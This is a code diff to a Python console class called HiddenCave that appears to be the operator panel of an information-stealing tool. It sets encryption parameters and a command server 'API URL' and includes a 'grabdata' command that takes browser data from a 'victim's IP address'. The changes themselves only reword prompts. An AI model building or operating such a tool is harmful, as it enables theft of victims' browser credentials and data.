@@ -26,9 +26,9 @@ class HiddenCave(cmd.Cmd):
             _ = os.system('clear')
 
     def do_init(self, arg):
-        "init command for setting key and iv or the API url.\nusage: save <filename>\n"
-        print("Choose an option:\n\t1. Set cryptographic parameters\n\t2. Set endpoint")
-        UserInput = self.core.GetUserInput("[+] Enter the number (1 or 2): ", "[-] Invalid input. Enter either '1' to set cryptographic parameters or '2' to set an endpoint.", 0, ["1", "2"], False)
+        "init command for setting key and iv or the API url.\n"
+        print("Choose an option:\n\t1. Set cryptographic parameters\n\t2. Set API URL")
+        UserInput = self.core.GetUserInput("[+] Enter the number (1 or 2): ", "[-] Invalid input. Enter either '1' to set cryptographic parameters or '2' to set an API URL.", 0, ["1", "2"], False)
 
         if UserInput == "1":
             if self.core.CheckParam() is True:
@@ -51,12 +51,12 @@ class HiddenCave(cmd.Cmd):
                 if status == "n":
                     return
 
-            print("[+] Enter the endpoint URL. It must be an HTTP URL and should not end with a slash.\n    Example of a valid URL: http://127.0.0.1")
-            UserInput = self.core.GetUserInput("ENDPOINT: ", "", 0, None, True)
+            print("[+] Enter the API URL. It must be an HTTP URL and should not end with a slash.\n    Example of a valid URL: http://<ip address>:<port>")
+            UserInput = self.core.GetUserInput("API: ", "", 0, None, True)
             if UserInput[:7] != "http://":
                 while True:
-                    print("[-] Invalid input, the endpoint URL must be http.")
-                    UserInput = self.core.GetUserInput("ENDPOINT: ", "", 0, None, True)
+                    print("[-] Invalid input, the API URL must be http.")
+                    UserInput = self.core.GetUserInput("API: ", "", 0, None, True)
                     if UserInput[:7] == "http://":
                         break
             self.core.ApiUrl = UserInput
@@ -124,7 +124,7 @@ class HiddenCave(cmd.Cmd):
                         print(f"\t- {extention}")
             print("#" * 35)
         else:
-            print("[-] You should first run the command check to check the endpoint and cryptographic parameters.")
+            print("[-] You should first run the command check to check the API status and cryptographic parameters.")
 
     def do_grabdata(self, arg):
         "grabdata a victim\'s browser data.\nusage: grabdata <victim's ip address>.\n"
